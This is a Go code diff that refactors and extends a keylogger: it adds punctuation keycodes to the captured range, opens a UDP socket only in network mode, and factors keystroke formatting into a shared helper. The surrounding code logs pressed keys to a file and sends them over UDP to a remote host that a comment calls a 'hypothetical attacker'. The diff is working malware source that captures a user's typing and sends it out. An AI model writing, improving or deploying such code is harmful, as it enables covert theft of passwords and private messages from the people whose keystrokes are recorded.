@@ -134,10 +134,17 @@ var codes = map[int]string{
 	0xB1: "PREVTRACK",
 	0xB2: "STOP",
 	0xB3: "PLAY/PAUSE",
+	0xBA: ":",
 	0xBB: "+",
 	0xBC: ",",
 	0xBD: "-",
 	0xBE: ".",
+	0xBF: "/",
+	0xC0: "`",
+	0xDB: "[",
+	0xDC: "\\",
+	0xDD: "]",
+	0xDE: "'",
 }
 
 var (
@@ -185,9 +192,13 @@ func (k *keylogger) start(duration int) {
 
 	k.active = true
 
-	// create UDP listener - regardless of whether the keylogger is set to this mode or not
-	conn, err := net.ListenUDP("udp", &net.UDPAddr{Port: 3333}) // outgoing port
-	check(err)
+	// create UDP listener if the keylogger is set to a mode that uses this capability
+	var conn *net.UDPConn
+	if k.mode == 1 {
+		var err error
+		conn, err = net.ListenUDP("udp", &net.UDPAddr{Port: 3333}) // outgoing port
+		check(err)
+	}
 
 	if duration == -1 { // then the loop should run forever (until manually stopped)
 		duration = 31536000 // the amount of seconds in one year
@@ -196,7 +207,7 @@ func (k *keylogger) start(duration int) {
 	// loops for the given amount of seconds
 	for start := time.Now(); time.Since(start) < time.Second*time.Duration(duration); {
 		currentKeys := []key{}
-		for keycode := 0x01; keycode < 0xB3; keycode++ {
+		for keycode := 0x01; keycode <= 0xDE; keycode++ {
 			_, exists := codes[keycode]
 			if !exists {
 				continue // skip this key if it is not in the map
@@ -248,17 +259,6 @@ func (k *keylogger) start(duration int) {
 	k.active = false
 }
 
-// returns all the events for when a key is pressed down
-// func (k *keylogger) getDownEvents() []key {
-// 	downEvents := []key{}
-// 	for _, key := range k.log {
-// 		if key.down {
-// 			downEvents = append(downEvents, key)
-// 		}
-// 	}
-// 	return downEvents
-// }
-
 func (k *keylogger) setMode(mode int, info string) {
 	k.mode = mode
 	if k.mode == 0 {
@@ -272,44 +272,21 @@ func (k *keylogger) setMode(mode int, info string) {
 
 // save buffer to file
 func (k *keylogger) saveToFile(buffer *[]key) {
-	fmt.Println("Doing a write")
-	downEvents := []key{}
-	for _, key := range *buffer {
-		if key.down {
-			downEvents = append(downEvents, key)
-		}
-	}
+	dataString := constructDataString(*buffer)
 
 	f, err := os.OpenFile(k.filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644) // what??
 	check(err)
 	defer f.Close()
 
-	for _, key := range downEvents {
-		_, err := f.WriteString(key.name + " ")
-		check(err)
-	}
+	_, err = f.WriteString(dataString)
+	check(err)
 
 	*buffer = nil
 }
 
 // send buffer data to remote host (hypothetical attacker)
 func (k *keylogger) sendToHost(buffer *[]key, conn *net.UDPConn) {
-	downEvents := []key{}
-	for _, key := range *buffer {
-		if key.down {
-			downEvents = append(downEvents, key)
-		}
-	}
-
-	// create string representing the keystrokes from the buffer
-	var dataString string = ""
-	for _, key := range downEvents {
-		if len(key.name) == 1 {
-			dataString += key.name
-		} else {
-			dataString += (" " + key.name + " ")
-		}
-	}
+	dataString := constructDataString(*buffer)
 
 	// resolve ip address
 	ipSplit := strings.Split(k.ipdst, ".")
@@ -324,6 +301,25 @@ func (k *keylogger) sendToHost(buffer *[]key, conn *net.UDPConn) {
 	}
 
 	*buffer = nil
+}
+
+func constructDataString(data []key) string {
+	downEvents := []key{}
+	for _, key := range data {
+		if key.down {
+			downEvents = append(downEvents, key)
+		}
+	}
+
+	var dataString string = ""
+	for _, key := range downEvents {
+		if len(key.name) == 1 {
+			dataString += key.name
+		} else {
+			dataString += (" " + key.name + " ")
+		}
+	}
+	return dataString
 }
 
 func (k *keylogger) setFlushInterval(seconds float64) {
